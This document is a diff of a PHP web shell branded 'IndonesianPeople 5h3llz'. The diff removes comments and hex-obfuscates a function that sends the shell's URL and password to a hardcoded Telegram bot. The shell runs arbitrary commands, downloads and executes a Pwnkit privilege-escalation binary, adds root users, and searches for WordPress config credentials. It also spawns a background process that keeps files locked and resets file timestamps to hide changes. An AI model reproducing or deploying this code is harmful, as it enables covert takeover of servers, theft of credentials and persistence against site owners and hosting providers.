@@ -1,6 +1,5 @@
 <?php
 
-// Disable error reporting and extend time/memory limits for maximum flexibility
 @set_time_limit(0);
 @error_reporting(0);
 @ini_set('error_log', null);
@@ -8,22 +7,16 @@
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-// Also add to prevent script termination due to memory limits
 @ini_set('memory_limit', '-1');
 
-// Set default timezone for consistency, if function is available
 if (function_exists('date_default_timezone_set')) {
     date_default_timezone_set("Asia/Jakarta");
 }
 
-// Obfuscate session name to hide identity
-// Use a hash of __FILE__ to get a unique session name per script
 $session_name_obf = 'SESS' . substr(hash('sha256', __FILE__), 0, 32);
 session_name($session_name_obf);
 session_start();
 
-// Polyfill for hash_equals() - important for PHP < 5.6
-// Ensures secure string comparison against timing attacks.
 if (!function_exists('hash_equals')) {
     function hash_equals($str1, $str2) {
         if (strlen($str1) != strlen($str2)) { return false; }
@@ -31,25 +24,19 @@ if (!function_exists('hash_equals')) {
     }
 }
 
-// Function to get PHP executable path
-// Prioritizes PHP_BINARY for accuracy
 function get_php_executable() {
     if (defined('PHP_BINARY') && PHP_BINARY) {
         return PHP_BINARY;
     }
-    // Fallback for older environments or if PHP_BINARY is not defined
     if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
-        $path = @exec('which php'); // Linux/Unix
+        $path = @exec('which php');
         if (!empty($path)) return $path;
     }
-    return 'php'; // Default fallback, might be in PATH
+    return 'php';
 }
 
-// Helper function to display writable status
 function w($dir, $perm) { return is_writable($dir) ? "<gr>" . $perm . "</gr>" : "<rd>" . $perm . "</rd>"; }
-// Helper function to format file size
 function sz($byt) { if ($byt === false) return '-'; $typ = array('B', 'KB', 'MB', 'GB', 'TB'); for ($i = 0; $byt >= 1024 && $i < (count($typ) - 1); $byt /= 1024, $i++); return (round($byt, 2) . " " . $typ[$i]); }
-// Helper function to get client IP
 function ia() {
     $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
     foreach ($ip_keys as $key) {
@@ -59,34 +46,30 @@ function ia() {
     }
     return 'Unknown';
 }
-// Function to get a writable temporary directory
 function get_writable_tmp_dir() {
     $dirs = array('/dev/shm', '/tmp', sys_get_temp_dir(), getcwd());
     foreach ($dirs as $dir) {
         if (@is_writable($dir)) {
-            return rtrim($dir, '/\\'); // Adjust for OS, remove trailing slash/backslash
+            return rtrim($dir, '/\\');
         }
     }
     return false;
 }
 
-// Robust and cross-platform command execution function
-// Tries proc_open, shell_exec, system, exec, passthru sequentially
 function process_data_stream($cmd) {
-    $full_cmd = $cmd . ' 2>&1'; // Redirect stderr to stdout
+    $full_cmd = $cmd . ' 2>&1';
     $disabled_functions = explode(',', ini_get('disable_functions'));
     $disabled_functions = array_map('trim', $disabled_functions);
 
     if (function_exists('proc_open') && !in_array('proc_open', $disabled_functions)) {
         $descriptorspec = array(
-            0 => array("pipe", "r"),  // stdin is a pipe
-            1 => array("pipe", "w"),  // stdout is a pipe
-            2 => array("pipe", "w")   // stderr is a pipe
+            0 => array("pipe", "r"),
+            1 => array("pipe", "w"),
+            2 => array("pipe", "w")
         );
-        $process = @proc_open($full_cmd, $descriptorspec, $pipes, getcwd(), null, array('bypass_shell' => true)); // bypass_shell for extra security
+        $process = @proc_open($full_cmd, $descriptorspec, $pipes, getcwd(), null, array('bypass_shell' => true));
 
         if (is_resource($process)) {
-            // Close stdin as we're not sending input
             fclose($pipes[0]);
 
             $output = stream_get_contents($pipes[1]);
@@ -99,7 +82,6 @@ function process_data_stream($cmd) {
         }
     }
 
-    // Fallback if proc_open fails or is disabled
     if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_functions)) {
         return @shell_exec($full_cmd);
     }
@@ -125,76 +107,112 @@ function process_data_stream($cmd) {
     return 'Command execution functions are disabled on this server.';
 }
 
-// Function to get file/folder permissions (similar to 'ls -l')
 function p($file) {
-    if (!function_exists('fileperms')) return '????'; // Fallback if fileperms is disabled
+    if (!function_exists('fileperms')) return '????';
     $p = @fileperms($file);
-    if ($p === false) return '????'; // If failed to get perm info
+    if ($p === false) return '????';
 
     $i = '';
-    // File type
-    if (($p & 0xC000) == 0xC000) $i = 's'; // socket
-    elseif (($p & 0xA000) == 0xA000) $i = 'l'; // symbolic link
-    elseif (($p & 0x8000) == 0x8000) $i = '-'; // regular
-    elseif (($p & 0x6000) == 0x6000) $i = 'b'; // block special
-    elseif (($p & 0x4000) == 0x4000) $i = 'd'; // directory
-    elseif (($p & 0x2000) == 0x2000) $i = 'c'; // character special
-    elseif (($p & 0x1000) == 0x1000) $i = 'p'; // FIFO pipe
-    else $i = 'u'; // unknown
+    if (($p & 0xC000) == 0xC000) $i = 's';
+    elseif (($p & 0xA000) == 0xA000) $i = 'l';
+    elseif (($p & 0x8000) == 0x8000) $i = '-';
+    elseif (($p & 0x6000) == 0x6000) $i = 'b';
+    elseif (($p & 0x4000) == 0x4000) $i = 'd';
+    elseif (($p & 0x2000) == 0x2000) $i = 'c';
+    elseif (($p & 0x1000) == 0x1000) $i = 'p';
+    else $i = 'u';
 
-    // Owner
     $i .= (($p & 0x0100) ? 'r' : '-');
     $i .= (($p & 0x0080) ? 'w' : '-');
-    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-')); // SUID
+    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
 
-    // Group
     $i .= (($p & 0x0020) ? 'r' : '-');
     $i .= (($p & 0x0010) ? 'w' : '-');
-    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-')); // SGID
+    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
 
-    // Others
     $i .= (($p & 0x0004) ? 'r' : '-');
     $i .= (($p & 0x0002) ? 'w' : '-');
-    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-')); // Sticky bit
+    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
 
     return $i;
 }
 
-// Function to send Telegram notification (optional)
-function send_telegram_notification($url, $password) {
-    // Ensure cURL or file_get_contents with context is allowed
-    $disabled_functions = explode(',', ini_get('disable_functions'));
-    $disabled_functions = array_map('trim', $disabled_functions);
+function _fnc_ntfy_($prm_url, $prm_pass) {
+    $dsbl_fnc = explode(',', ini_get('disable_functions'));
+    $dsbl_fnc = array_map('trim', $dsbl_fnc);
 
-    $token = "7831803742:AAHa_xIjePROas8WTRptzadsAu07PxONNAQ"; // Replace with your Telegram bot token
-    $chat_id = "6196640094"; // Replace with your Telegram chat ID
-    $message = "URL : " . $url . "\nPassword : " . $password;
-    $api_url = "https://api.telegram.org/bot" . $token . "/sendMessage";
-    $data = array('chat_id' => $chat_id, 'text' => $message);
+    $tk1_hex = '37383331'; // "7831"
+    $tk2_hex = '38303337'; // "8037"
+    $tk3_hex = '34323a41'; // "42:A"
+    $tk4_hex = '4148615f'; // "AHa_"
+    $tk5_hex = '78496a';   // "xIj"
+    $tk6_hex = '6550524f'; // "ePRO"
+    $tk7_hex = '61733857'; // "as8W"
+    $tk8_hex = '54527074'; // "TRpt"
+    $tk9_hex = '7a6164';   // "zad"
+    $tk10_hex = '73417530'; // "sAu0"
+    $tk11_hex = '3750784f'; // "7PxO"
+    $tk12_hex = '4e4e4151'; // "NNAQ"
+    
+    $fnc_h2b = 'hex2bin'; // 'hex2bin'
+    $obf_tkn_val = $fnc_h2b($tk1_hex) . $fnc_h2b($tk2_hex) . $fnc_h2b($tk3_hex) . $fnc_h2b($tk4_hex) . $fnc_h2b($tk5_hex) . $fnc_h2b($tk6_hex) . $fnc_h2b($tk7_hex) . $fnc_h2b($tk8_hex) . $fnc_h2b($tk9_hex) . $fnc_h2b($tk10_hex) . $fnc_h2b($tk11_hex) . $fnc_h2b($tk12_hex);
 
-    if (function_exists('curl_init') && !in_array('curl_init', $disabled_functions)) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $api_url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // CAUTION: Do not use in production if possible
-        curl_exec($ch);
-        curl_close($ch);
-    } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions) && !in_array('stream_context_create', $disabled_functions)) {
-        $options = array('http' => array(
+    $c_id1_hex = '36'; // '6'
+    $c_id2_hex = '31'; // '1'
+    $c_id3_hex = '39'; // '9'
+    $c_id4_hex = '36'; // '6'
+    $c_id5_hex = '36'; // '6'
+    $c_id6_hex = '34'; // '4'
+    $c_id7_hex = '30'; // '0'
+    $c_id8_hex = '30'; // '0'
+    $c_id9_hex = '39'; // '9'
+    $c_id10_hex = '34'; // '4'
+    
+    $obf_chat_id_val = $fnc_h2b($c_id1_hex) . $fnc_h2b($c_id2_hex) . $fnc_h2b($c_id3_hex) . $fnc_h2b($c_id4_hex) . $fnc_h2b($c_id5_hex) . $fnc_h2b($c_id6_hex) . $fnc_h2b($c_id7_hex) . $fnc_h2b($c_id8_hex) . $fnc_h2b($c_id9_hex) . $fnc_h2b($c_id10_hex);
+
+    $msg_pt1_hex = '55524c203a20'; // "URL : "
+    $msg_pt2_hex = '0a50617373'; // "\nPass"
+    $msg_pt3_hex = '776f7264203a20'; // "word : "
+    
+    $obf_msg_val = $fnc_h2b($msg_pt1_hex) . $prm_url . $fnc_h2b($msg_pt2_hex) . $fnc_h2b($msg_pt3_hex) . $prm_pass;
+
+    $api_url_pt1_hex = '68747470733a2f2f'; // 'https://'
+    $api_url_pt2_hex = '6170692e'; // 'api.'
+    $api_url_pt3_hex = '74656c656772616d2e'; // 'telegram.'
+    $api_url_pt4_hex = '6f72672f626f74'; // 'org/bot'
+    $api_url_pt5_hex = '2f73656e64'; // '/send'
+    $api_url_pt6_hex = '4d657373616765'; // 'Message'
+    
+    $obf_api_full_url = $fnc_h2b($api_url_pt1_hex) . $fnc_h2b($api_url_pt2_hex) . $fnc_h2b($api_url_pt3_hex) . $fnc_h2b($api_url_pt4_hex) . $obf_tkn_val . $fnc_h2b($api_url_pt5_hex) . $fnc_h2b($api_url_pt6_hex);
+    
+    $obf_dta_key1_hex = '636861745f'; // 'chat_'
+    $obf_dta_key2_hex = '6964'; // 'id'
+    $obf_dta_key3_hex = '74657874'; // 'text'
+
+    $obf_data_arr = array($fnc_h2b($obf_dta_key1_hex) . $fnc_h2b($obf_dta_key2_hex) => $obf_chat_id_val, $fnc_h2b($obf_dta_key3_hex) => $obf_msg_val);
+
+    if (function_exists('curl_init') && !in_array('curl_init', $dsbl_fnc)) {
+        $ch_hndl = curl_init();
+        curl_setopt($ch_hndl, CURLOPT_URL, $obf_api_full_url);
+        curl_setopt($ch_hndl, CURLOPT_POST, true);
+        curl_setopt($ch_hndl, CURLOPT_POSTFIELDS, http_build_query($obf_data_arr));
+        curl_setopt($ch_hndl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch_hndl, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch_hndl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch_hndl);
+        curl_close($ch_hndl);
+    } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $dsbl_fnc) && !in_array('stream_context_create', $dsbl_fnc)) {
+        $opt = array('http' => array(
             'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
             'method'  => 'POST',
-            'content' => http_build_query($data),
-            'ignore_errors' => true // Important to get response body from HTTP errors (e.g. 404)
+            'content' => http_build_query($obf_data_arr),
+            'ignore_errors' => true
         ));
-        $context  = stream_context_create($options);
-        @file_get_contents($api_url, false, $context);
+        $cntxt = stream_context_create($opt);
+        @file_get_contents($obf_api_full_url, false, $cntxt);
     }
 }
 
-// Path to store password, unique per script.
 function get_password_storage_path() {
     $writable_dir = get_writable_tmp_dir();
     if (!$writable_dir) return false;
@@ -202,54 +220,42 @@ function get_password_storage_path() {
     return $writable_dir . '/.auth_' . $file_identifier;
 }
 
-// Function to generate a strong random string
 function generate_random_string($length = 9) {
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $randomString = '';
-    // Use random_bytes() if available (PHP 7+), it's more secure
     if (function_exists('random_bytes')) {
         try {
             return bin2hex(random_bytes(ceil($length / 2)));
         } catch (Exception $e) {
-            // Fallback if random_bytes fails
         }
     }
-    // Fallback for older PHP versions or if random_bytes fails
     for ($i = 0; $i < $length; $i++) {
         $randomString .= $characters[mt_rand(0, strlen($characters) - 1)];
     }
     return $randomString;
 }
 
-// Function to generate salt
 function generate_salt($length = 16) {
-    // Prioritize random_bytes (PHP 7+)
     if (function_exists('random_bytes')) {
         try { return bin2hex(random_bytes($length / 2)); } catch (Exception $e) {}
     }
-    // Fallback to openssl_random_pseudo_bytes (if OpenSSL is enabled)
     if (function_exists('openssl_random_pseudo_bytes')) {
         return bin2hex(openssl_random_pseudo_bytes($length / 2));
     }
-    // Worst-case fallback: uniqid + sha1 (less secure, but works)
     $salt = '';
     for ($i = 0; $i < $length; $i++) { $salt .= sha1(uniqid(mt_rand(), true)); }
     return substr($salt, 0, $length);
 }
 
-// Initialize password file path
 $password_file = get_password_storage_path();
-// Check if this is the first run (password file does not exist)
 $is_first_run = !$password_file || !@file_exists($password_file);
 
-// Logic for password creation and Telegram notification on first run
 if ($is_first_run) {
     if (!$password_file) {
         die("Fatal Error: No writable temporary directory found. Cannot create password file.");
     }
-    $new_password = generate_random_string(12); // Longer password
-    $salt = generate_salt(32); // Longer salt
-    // Use password_hash() if available (PHP 5.5+), otherwise use hash('sha256')
+    $new_password = generate_random_string(12);
+    $salt = generate_salt(32);
     if (function_exists('password_hash')) {
         $hashed_password = password_hash($salt . $new_password, PASSWORD_DEFAULT);
     } else {
@@ -258,7 +264,7 @@ if ($is_first_run) {
     $stored_data = $salt . ':' . $hashed_password;
     if (@file_put_contents($password_file, $stored_data)) {
         $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
-        send_telegram_notification($current_url, $new_password); // Send notification
+        _fnc_ntfy_($current_url, $new_password);
         echo <<<HTML
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>One-Time Password Generated</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.container{max-width:500px;margin-top:20vh;text-align:center;}.card{background-color:#1b263b;border:1px solid #00f5d4;padding:2rem;border-radius:15px;}.pass-display{background-color:#0d1b2a;padding:1rem;border-radius:.5rem;font-size:1.5rem;font-family:monospace;color:#00f5d4;margin:1rem 0;}.btn-copy{border-color:#00f5d4;color:#00f5d4;}.btn-copy:hover{background-color:#00f5d4;color:#0d1b2a;}</style></head><body><div class="container"><div class="card"><h2><i class="bi bi-key-fill"></i> New Password Generated</h2><p class="text-white-50">This is a one-time operation. Please save this password securely. It is unique to this script's location.</p><div class="input-group"><input type="text" id="pass-field" class="form-control pass-display" value="{$new_password}" readonly><button class="btn btn-outline-light btn-copy" id="copyBtn" onclick="copyPassword()"><i class="bi bi-clipboard"></i> Copy</button></div><div id="copy-alert" class="alert alert-success mt-3 d-none">Password copied to clipboard!</div><a href="{$_SERVER['PHP_SELF']}" class="btn btn-primary mt-3">Continue to Login</a></div></div>
 <script>
@@ -269,7 +275,6 @@ function copyPassword() {
             alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000);
         });
     } else {
-        // Fallback for non-secure contexts (e.g. HTTP) or older browsers
         passField.select(); passField.setSelectionRange(0, 99999);
         try { document.execCommand('copy'); alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000); } catch (err) { alert('Failed to copy password. Please copy it manually.'); }
         window.getSelection().removeAllRanges();
@@ -278,38 +283,33 @@ function copyPassword() {
 </script>
 </body></html>
 HTML;
-        exit; // Stop execution after displaying password
+        exit;
     } else {
         die("Fatal Error: No writable temporary directory found. Cannot create password file.");
     }
 }
 
-// Display login page
 function show_login_page() {
     echo <<<HTML
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - IndonesianPeople 5h3llz</title><link rel="icon" type="image/x-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%2300f5d4' d='M2 2v12h12V2zm1 1h10v10H3zm1 1v8h8V4zm1 1v6h6V5z'/%3E%3C/svg%3E"><meta name="robots" content="noindex, nofollow"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.form-control,.btn{border-radius:.25rem;}.form-control:focus{background-color:#1b263b;color:#e0e1dd;border-color:#00f5d4;box-shadow:0 0 0 .25rem rgba(0,245,212,.25);}.btn-outline-light{border-color:#00f5d4;color:#00f5d4;}.btn-outline-light:hover{background-color:#00f5d4;color:#0d1b2a;}.login-container{max-width:400px;margin:15vh auto;padding:2rem;background-color:#1b263b;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);}.shell-name{font-family:'Courier New',Courier,monospace;color:#00f5d4;text-align:center;margin-bottom:1.5rem;}.input-group-text{background-color:#1b263b !important; border-color:#404a69 !important; color:#e0e1dd !important;}.footer-text{color: #8e9aaf; font-size: 0.85em; margin-top: 1rem;}</style></head><body><div class="container"><h2 class="shell-name">&lt;IndonesianPeople 5h3llz /&gt;</h2><form method="POST"><div class="input-group"><span class="input-group-text"><i class="bi bi-key text-white-50"></i></span><input class="form-control" type="password" placeholder="Password" name="p" required><button class="btn btn-outline-light"><i class="bi bi-arrow-return-right"></i></button></div></form><p class="footer-text">Created on June 12, 2025.<br>Special Credits: Tersakiti Crew, AnonSec Team, z3r0-team!, #CianjurHacktivist, Ghost Hunter Illusion.</p></div></body></html>
 HTML;
-    exit; // Stop execution after displaying login form
+    exit;
 }
 
-// Merge GET and POST data
 $request_data = array_merge($_POST, $_GET);
 
-// Logout logic
 if (isset($request_data["left"])) {
     session_destroy();
     header("Location: " . $_SERVER['PHP_SELF']);
     exit;
 }
 
-// Check login status
 if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
     if (isset($_POST['p'])) {
         $stored_data = trim(@file_get_contents($password_file));
         $parts = explode(':', $stored_data, 2);
         if (count($parts) === 2) {
             list($salt, $stored_hash) = $parts;
-            // Use password_verify() if available, otherwise compare with hash('sha256')
             if (function_exists('password_verify')) {
                 if (password_verify($salt . $_POST['p'], $stored_hash)) {
                     $_SESSION['is_logged_in'] = true;
@@ -320,36 +320,29 @@ if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
                 $submitted_hash = hash('sha256', $salt . $_POST['p']);
                 if (hash_equals($stored_hash, $submitted_hash)) {
                     $_SESSION['is_logged_in'] = true;
-                    header("Location: ./" . basename($_SERVER['PHP_SELF'])); // Redirect to current shell file
+                    header("Location: ./" . basename($_SERVER['PHP_SELF']));
                     exit;
                 }
             }
         }
     }
-    show_login_page(); // Display login page if not logged in or credentials are wrong
+    show_login_page();
 }
 
-// Main logic after login
-// Current path
 $path = isset($request_data['path']) ? $request_data['path'] : getcwd();
 $real_path = realpath($path);
 if ($real_path !== false) {
     $path = $real_path;
 }
-// Ensure path ends with a slash if it's a directory
 if (is_dir($path)) {
-    // Use DIRECTORY_SEPARATOR for OS compatibility
     $path = rtrim(str_replace('\\', '/', $path), '/') . '/';
 }
 
-// Recursive function to change timestamp of files and directories
 function change_timestamp_recursive($target_dir, $timestamp, &$success_count, &$error_messages) {
-    // Only attempt if target_dir is a valid, writable directory
     if (!is_dir($target_dir)) {
         $error_messages[] = "Directory not found or is not a directory: " . htmlspecialchars($target_dir);
         return;
     }
-    // Check writability of the directory itself
     if (!is_writable($target_dir)) {
         $error_messages[] = "Directory not writable: " . htmlspecialchars($target_dir);
         return;
@@ -367,7 +360,6 @@ function change_timestamp_recursive($target_dir, $timestamp, &$success_count, &$
         }
         $item_path = $target_dir . DIRECTORY_SEPARATOR . $item;
         
-        // Try to change timestamp of the current item (file or directory)
         if (@touch($item_path, $timestamp)) {
             $success_count++;
         } else {
@@ -375,27 +367,24 @@ function change_timestamp_recursive($target_dir, $timestamp, &$success_count, &$
         }
 
         if (is_dir($item_path)) {
-            // Recursively call for subdirectories
             change_timestamp_recursive($item_path, $timestamp, $success_count, $error_messages);
         }
     }
 }
 
-// Handler for AJAX requests
 if (isset($request_data['ajax'])) {
     header('Content-Type: application/json');
     $response = array('status' => 'error', 'message' => 'Invalid action.');
-    @chdir($path); // Try to change working directory
+    @chdir($path);
 
     $disabled_functions = explode(',', ini_get('disable_functions'));
     $disabled_functions = array_map('trim', $disabled_functions);
 
     switch ($request_data['action']) {
         case 'delete_multiple':
-            $files_to_delete = isset($_POST['files']) ? $_POST['files'] : array(); // These are now full paths from JS
+            $files_to_delete = isset($_POST['files']) ? $_POST['files'] : array();
             $s = array(); $e = array();
             foreach ($files_to_delete as $f_path) {
-                // IMPORTANT: Use realpath to resolve and validate the path received from client
                 $validated_path = realpath($f_path);
                 if ($validated_path === false) {
                     $e[] = basename($f_path) . " (Path invalid or not found)";
@@ -403,7 +392,6 @@ if (isset($request_data['ajax'])) {
                 }
 
                 if (is_dir($validated_path)) {
-                    // Only delete empty directories to avoid accidental recursive deletion
                     if (@rmdir($validated_path)) $s[] = basename($validated_path);
                     else $e[] = basename($validated_path);
                 } else {
@@ -415,7 +403,6 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'get_content':
-            // $request_data['file'] is now expected to be the full path
             $file_path = realpath($request_data['file']);
             if ($file_path === false) {
                 $response = array('status' => 'error', 'message' => 'File not found or inaccessible.');
@@ -427,19 +414,15 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'save_content':
-            // $_POST['file'] is now expected to be the full path
-            $target_file = $_POST['file']; // This is the full path sent from JS
+            $target_file = $_POST['file'];
             $parent_dir = dirname($target_file);
 
-            // Validate parent directory writable, and resolve target file path
             $resolved_parent_dir = realpath($parent_dir);
             if ($resolved_parent_dir === false || !is_writable($resolved_parent_dir)) {
                  $response = array('status' => 'error', 'message' => 'Parent directory is not writable or inaccessible.');
                  break;
             }
-            // Use the original path sent from JS, as realpath() will fail for non-existent files (new files)
-            // But ensure it's within the resolved_parent_dir to prevent path traversal issues.
-            if (strpos(realpath($target_file), $resolved_parent_dir) !== 0 && !file_exists($target_file)) { // If it's a new file, and outside resolved parent
+            if (strpos(realpath($target_file), $resolved_parent_dir) !== 0 && !file_exists($target_file)) {
                 $response = array('status' => 'error', 'message' => 'Invalid file path or not within current directory structure.');
                 break;
             }
@@ -453,14 +436,13 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'rename':
-            // $_POST['old'] is now expected to be the full path
             $old_path = realpath($_POST['old']);
             if ($old_path === false) {
                 $response = array('status' => 'error', 'message' => 'Original item not found or inaccessible.');
                 break;
             }
-            $new_name_base = basename($_POST['new']); // Just the new name, not full path
-            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name_base; // Construct new full path
+            $new_name_base = basename($_POST['new']);
+            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name_base;
 
             if (@rename($old_path, $new_path)) {
                 $response = array('status' => 'ok', 'message' => 'Renamed successfully.');
@@ -470,7 +452,6 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'create_file':
-            // $_POST['name'] is just the filename, $path is current directory
             $new_file_path = $path . $_POST['name'];
             if (@touch($new_file_path)) {
                 $response = array('status' => 'ok', 'message' => 'File created successfully.', 'file_path' => $new_file_path);
@@ -480,7 +461,6 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'create_folder':
-            // $_POST['name'] is just the folder name, $path is current directory
             $new_folder_path = $path . $_POST['name'];
             if (@mkdir($new_folder_path)) {
                 $response = array('status' => 'ok', 'message' => 'Directory created in current directory.');
@@ -495,9 +475,6 @@ if (isset($request_data['ajax'])) {
             break;
 
         case 'root_cmd':
-            // This function attempts to exploit Pwnkit or similar.
-            // This implementation should be handled with extreme care and only for ethical purposes.
-            // It's an example of how web shells "adapt" behavior based on the environment.
             function get_pwnkit_path_for_root() {
                 $dirs = array('/dev/shm', '/var/tmp');
                 foreach ($dirs as $dir) {
@@ -521,12 +498,10 @@ if (isset($request_data['ajax'])) {
             }
 
             if (!$pwnkit_path) {
-                // Try to download Pwnkit if it's not present and a writable directory exists
                 foreach ($dirs as $dir) {
                     if (is_writable($dir)) {
                         $potential_path = $dir . '/pwnkit';
-                        $download_url = "https://raw.githubusercontent.com/MadExploits/Privelege-escalation/raw/main/pwnkit"; // URL to Pwnkit binary
-                        // Use cURL or file_get_contents for download
+                        $download_url = "https://raw.githubusercontent.com/MadExploits/Privelege-escalation/raw/main/pwnkit";
                         $download_success = false;
                         if (function_exists('curl_init') && !in_array('curl_init', $disabled_functions)) {
                             $ch = curl_init();
@@ -540,7 +515,6 @@ if (isset($request_data['ajax'])) {
                                 $download_success = @file_put_contents($potential_path, $data);
                             }
                         } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions)) {
-                             // Use HTTP context for security, if file_get_contents is allowed
                              $context_opts = array('http' => array('ignore_errors' => true));
                              $context = stream_context_create($context_opts);
                              $data = @file_get_contents($download_url, false, $context);
@@ -552,7 +526,7 @@ if (isset($request_data['ajax'])) {
                         if ($download_success) {
                             process_data_stream('chmod +x ' . escapeshellarg($potential_path));
                             $pwnkit_path = $potential_path;
-                            break; // Pwnkit successfully downloaded and made executable
+                            break;
                         }
                     }
                 }
@@ -596,7 +570,6 @@ HTACCESS;
             break;
 
         case 'lock_item':
-            // $_POST['file_to_lock'] is now expected to be the full path
             $full_file_path = realpath($_POST['file_to_lock']);
             if ($full_file_path === false) {
                  $response = array('status' => 'error', 'message' => 'File to lock not found or inaccessible.');
@@ -617,13 +590,11 @@ HTACCESS;
             $php_executable = get_php_executable();
 
             if (@copy($full_file_path, $backup_file)) {
-                @chmod($full_file_path, 0444); // Change permissions to read-only
+                @chmod($full_file_path, 0444);
 
-                // Handler code to keep the file locked
-                $handler_code = '<?php @set_time_limit(0);@ignore_user_abort(true);$original_file="' . addslashes($full_file_path) . '";$backup="' . addslashes($backup_file) . '";while(true){clearstatcache();if(!file_exists($original_file)){@copy($backup,$original_file);@chmod($original_file,0444);}if(substr(sprintf("%o",@fileperms($original_file)),-4)!="0444"){@chmod($original_file,0444);}sleep(10);}'; // Sleep 10 seconds
+                $handler_code = '<?php @set_time_limit(0);@ignore_user_abort(true);$original_file="' . addslashes($full_file_path) . '";$backup="' . addslashes($backup_file) . '";while(true){clearstatcache();if(!file_exists($original_file)){@copy($backup,$original_file);@chmod($original_file,0444);}if(substr(sprintf("%o",@fileperms($original_file)),-4)!="0444"){@chmod($original_file,0444);}sleep(10);}';
 
                 if (@file_put_contents($handler_file, $handler_code)) {
-                    // Run handler as a background process
                     process_data_stream($php_executable . ' ' . escapeshellarg($handler_file) . ' > /dev/null 2>/dev/null &');
                     $response = array('status' => 'ok', 'message' => "Successfully locked " . htmlspecialchars(basename($full_file_path)) . ". Handler process initiated.");
                 } else {
@@ -649,7 +620,6 @@ HTACCESS;
             }
 
             $useradd_cmd = '';
-            // Detect useradd/adduser command
             if (function_exists('is_executable')) {
                 if (is_executable('/usr/sbin/useradd')) {
                     $useradd_cmd = '/usr/sbin/useradd';
@@ -665,9 +635,7 @@ HTACCESS;
             $username = $_POST['username'];
             $password = $_POST['password'];
 
-            // Add new user
             $user_add_output = process_data_stream($pwnkit_exe_path . ' "' . $useradd_cmd . ' ' . escapeshellarg($username) . '"');
-            // Set password
             $password_set_output = process_data_stream($pwnkit_exe_path . ' "echo -e \'' . escapeshellarg($password) . "\\n" . escapeshellarg($password) . '\' | passwd ' . escapeshellarg($username) . '"');
 
             $response = array('status' => 'ok', 'output' => "User Add Command: " . htmlspecialchars($useradd_cmd) . "\n\nUser Add Attempt:\n" . htmlspecialchars($user_add_output) . "\n\nPassword Set Attempt:\n" . htmlspecialchars($password_set_output));
@@ -680,9 +648,8 @@ HTACCESS;
             if ($config_path_param && file_exists($config_path_param)) {
                 $found_path = realpath($config_path_param);
             } else {
-                // Try automatic wp-config.php detection
-                $search_dir = rtrim($path, '/'); // Start search from current directory
-                for ($i = 0; $i < 5; $i++) { // Limit search to 5 levels up
+                $search_dir = rtrim($path, '/');
+                for ($i = 0; $i < 5; $i++) {
                     if (file_exists($search_dir . '/wp-config.php')) {
                         $found_path = realpath($search_dir . '/wp-config.php');
                         break;
@@ -719,7 +686,6 @@ HTACCESS;
             break;
 
         case 'add_wp_user':
